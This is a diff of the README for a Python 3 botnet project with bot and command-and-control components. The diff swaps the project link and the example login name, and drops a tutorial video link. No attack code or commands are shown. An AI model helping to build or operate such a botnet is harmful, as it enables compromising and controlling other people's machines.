@@ -1,6 +1,6 @@
 # Python3-Botnet ![](https://img.shields.io/badge/Version-2.1-brightgreen.svg)  ![](https://img.shields.io/badge/license-GPL3.0-blue.svg)
 
-**Project moved to [here](https://github.com/Leeon123/Aoyama)**
+**Project moved to [here](https://github.com/MLX15)**
 
 **Use Python3 to build a botnet (include bot and c&amp;c)**
 
@@ -10,7 +10,6 @@
 
 Build up a easy P2P botnet with python3.
 
-***Youtube Video: https://youtu.be/3_JnAXVtFNs (outdated)***
 
 I will upload xor version and new tut video as fast as i can :)
 
@@ -52,12 +51,12 @@ At this moment, u should create a text called login.txt and input the username a
 
 Like this:
 
-        Leeon123 test
+        MLX15 test
 
 After that, Just input ur username and password.
         
                     
-            Username:Leeon123
+            Username:MLX15
             Password:test
             
 **Welcome to Python3 C&C Server.**
